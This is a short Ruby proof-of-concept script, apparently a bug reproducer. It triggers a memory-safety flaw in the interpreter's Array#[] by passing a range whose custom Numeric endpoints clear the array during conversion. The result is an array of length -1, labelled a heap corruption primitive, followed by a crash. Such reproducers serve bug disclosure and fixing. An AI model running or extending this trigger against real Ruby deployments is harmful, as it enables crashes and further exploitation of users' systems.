# Array#[] with a Range whose Numeric-subclass endpoints run to_int that clears the receiver.
# rb_ary_aref1: ary_subseq_len returns -1 (beg > new len); the `len==0` check (array.c:1945)
# misses len<0, so ary_make_partial builds an Array with RARRAY_LEN == -1 + dangling shared ptr.
class Evil < Numeric
  def initialize(v); @v = v; end
  def val; @v; end
  def <=>(o); @v <=> (o.is_a?(Evil) ? o.val : o); end
  def to_int; $a.clear; @v; end
  def to_i; @v; end
  def coerce(o); [o, @v]; end
end
$a = (1..3000).to_a
res = $a[Range.new(Evil.new(2900), Evil.new(2950))]
puts "Array#[] returned length = #{res.length}"   # => -1 : heap corruption primitive
res + [1, 2, 3]                                    # use the corrupt array -> crash
puts "no crash"
